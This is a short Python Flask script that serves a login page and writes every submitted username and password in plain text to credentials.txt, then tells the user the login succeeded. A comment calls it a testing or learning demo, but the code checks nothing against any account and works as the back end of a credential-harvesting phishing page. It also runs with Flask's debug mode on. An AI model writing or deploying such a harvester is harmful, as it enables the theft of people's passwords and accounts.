from flask import Flask, render_template, request, redirect

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    # Save to file (only for testing/learning purposes)
    with open('credentials.txt', 'a') as f:
        f.write(f"Username: {username}, Password: {password}\n")

    return "Login successful (credentials saved for demo purpose)"

if __name__ == '__main__':
    app.run(debug=True)